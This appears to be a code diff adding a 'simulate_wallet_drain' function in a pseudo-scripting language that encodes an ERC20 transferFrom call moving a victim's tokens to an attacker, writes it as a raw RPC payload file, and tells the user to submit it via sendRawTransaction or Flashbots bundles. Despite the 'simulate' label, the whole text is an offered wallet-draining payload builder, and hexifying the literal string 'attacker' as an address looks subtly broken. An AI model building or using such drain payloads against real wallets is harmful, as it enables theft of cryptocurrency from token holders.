@@ -1,0 +1,22 @@
+define function simulate_wallet_drain(victim, token, amount)
+    print "🧨 Simulating ERC20 drain: transferFrom(" victim " → attacker)"
+
+    # ERC20 transferFrom() selector
+    let selector = "23b872dd"
+
+    # Encode parameters
+    let from = pad(hexify(victim), 64)
+    let to = pad(hexify("attacker"), 64)
+    let amt = pad(hexify(amount), 64)
+
+    let calldata = selector + from + to + amt
+
+    print "📦 transferFrom Payload:"
+    print "  0x" + calldata
+
+    let json = "{ \"to\": \"" + token + "\", \"data\": \"0x" + calldata + "\" }"
+    write json to "output/ethcall_drain.json"
+
+    print "📄 RPC payload written to output/ethcall_drain.json"
+    print "⚠️ Use with sendRawTransaction or Flashbots bundles"
+end
